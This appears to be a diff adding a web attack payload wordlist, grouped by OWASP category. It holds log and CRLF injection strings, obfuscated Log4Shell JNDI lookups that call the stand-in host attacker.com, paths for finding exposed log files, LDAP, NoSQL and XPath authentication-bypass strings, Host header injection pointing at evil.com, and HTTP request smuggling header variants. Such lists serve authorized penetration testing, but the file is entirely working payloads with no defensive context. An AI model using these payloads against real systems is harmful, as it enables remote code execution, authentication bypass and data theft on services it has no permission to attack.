@@ -1,0 +1,184 @@
+# ══════════════════════════════════════════
+# A09 - Logging & Monitoring Failures
+# ══════════════════════════════════════════
+
+# ── Log Injection ──
+admin%0d%0aGET /admin HTTP/1.1
+admin%0aGET /admin HTTP/1.1
+test%0d%0aX-Injected: header
+test%0aX-Injected: header
+%0d%0aContent-Length:0%0d%0a%0d%0aHTTP/1.1 200 OK
+\r\nX-Injected: header
+\nX-Injected: header
+
+# ── Log4Shell in Log Fields ──
+${jndi:ldap://attacker.com/a}
+${jndi:ldaps://attacker.com/a}
+${jndi:rmi://attacker.com/a}
+${jndi:dns://attacker.com/a}
+${${lower:j}ndi:${lower:l}dap://attacker.com/a}
+${${::-j}${::-n}${::-d}${::-i}:ldap://attacker.com/a}
+${j${::-n}di:ldap://attacker.com/a}
+${${env:NaN:-j}ndi:ldap://attacker.com/a}
+
+# ── Exposed Log Endpoints ──
+/logs
+/logs/
+/log
+/log/
+/error.log
+/access.log
+/debug.log
+/app.log
+/application.log
+/server.log
+/system.log
+/audit.log
+/security.log
+/trace.log
+/logs/error.log
+/logs/access.log
+/logs/debug.log
+/logs/app.log
+/logs/laravel.log
+/storage/logs/laravel.log
+/var/log/apache2/access.log
+/var/log/nginx/access.log
+/api/logs
+/api/log
+/api/audit
+/api/events
+/api/activity
+/admin/logs
+/admin/log
+/admin/audit
+
+# ══════════════════════════════════════════
+# A03 Extra - LDAP Injection
+# ══════════════════════════════════════════
+*
+*)(&
+*)(|(&
+*()|%26'
+*()|&'
+*(|(mail=*))
+*(|(objectclass=*))
+*)(uid=*))(|(uid=*
+*)(|(password=*))
+*(|(cn=*))
+admin)(&(password=*)
+admin)(|(password=*)
+admin)(!(&(1=0)
+x)(cn=*
+x)(|(cn=*
+)(cn=*
+|(cn=*
+&(cn=*
+!(cn=*
+*(cn=*
+admin*
+*admin
+*admin*
+admin)(|(cn=*
+admin))(|(cn=*
+admin))(|(cn=admin
+*)(objectClass=*
+*)(objectClass=person
+*)(objectClass=user
+*)(objectClass=computer
+*)(objectClass=group
+*)(objectClass=organizationalUnit
+*)(objectClass=domain
+*)(objectClass=*))(|(objectClass=*
+
+# ══════════════════════════════════════════
+# A03 Extra - Header Injection / CRLF
+# ══════════════════════════════════════════
+%0d%0aSet-Cookie:crlfinjected=1
+%0aSet-Cookie:crlfinjected=1
+\r\nSet-Cookie:crlfinjected=1
+\nSet-Cookie:crlfinjected=1
+%0d%0aLocation:https://evil.com
+%0aLocation:https://evil.com
+%0d%0aContent-Type:text/html
+%0d%0aX-XSS-Protection:0
+%0d%0a%0d%0a<script>alert(1)</script>
+%E5%98%8A%E5%98%8DSet-Cookie:crlfinjected=1
+%E5%98%8A%E5%98%8DLocation:https://evil.com
+%u000aSet-Cookie:crlfinjected=1
+%u000dSet-Cookie:crlfinjected=1
+
+# ══════════════════════════════════════════
+# A03 Extra - Host Header Injection
+# ══════════════════════════════════════════
+Host: evil.com
+Host: localhost
+Host: 127.0.0.1
+Host: attacker.com
+X-Forwarded-Host: evil.com
+X-Host: evil.com
+X-Forwarded-Server: evil.com
+X-HTTP-Host-Override: evil.com
+Forwarded: host=evil.com
+
+# ══════════════════════════════════════════
+# A03 Extra - HTTP Request Smuggling
+# ══════════════════════════════════════════
+# CL.TE
+Transfer-Encoding: chunked
+Content-Length: 6
+# TE.CL
+Transfer-Encoding: chunked
+Transfer-Encoding: x
+# TE.TE obfuscation
+Transfer-Encoding: xchunked
+Transfer-Encoding : chunked
+Transfer-Encoding: chunked
+Transfer-Encoding: x
+Transfer-Encoding:[tab]chunked
+[space]Transfer-Encoding: chunked
+X: X[\n]Transfer-Encoding: chunked
+Transfer-Encoding
+: chunked
+
+# ══════════════════════════════════════════
+# A03 Extra - NoSQL Injection
+# ══════════════════════════════════════════
+{"$gt": ""}
+{"$ne": null}
+{"$ne": "invalid"}
+{"$gt": "", "$lt": "z"}
+{"$regex": ".*"}
+{"$regex": "^admin"}
+{"$where": "1==1"}
+{"$where": "sleep(5000)"}
+{"$where": "this.password.match(/.*/)"}
+{"$or": [{"username": "admin"}, {"username": {"$gt": ""}}]}
+{"username": {"$ne": null}, "password": {"$ne": null}}
+{"username": {"$in": ["admin", "administrator", "root"]}}
+' || 1==1//
+' || 1==1%00
+' || 'a'=='a
+admin' || 'a'=='a
+{"username": "admin", "password": {"$gt": ""}}
+{"username": {"$gt": ""}, "password": {"$gt": ""}}
+
+# ══════════════════════════════════════════
+# A03 Extra - XPath Injection
+# ══════════════════════════════════════════
+' or '1'='1
+' or ''='
+x' or 1=1 or 'x'='y
+' or 1=1 or ''='
+' and count(/*)=1 and '1'='1
+' and count(/*)=2 and '1'='1
+'or string-length(name(/*[1]))=8 or'
+'or //user[username/text()='admin'] or'
+' or contains(//user[1]/username,'a') or '
+' or substring(//user[1]/username,1,1)='a' or '
+admin' or '1'='1
+admin' or 1=1--
+') or ('1'='1
+') or 1=1--
+" or "1"="1
+" or 1=1--
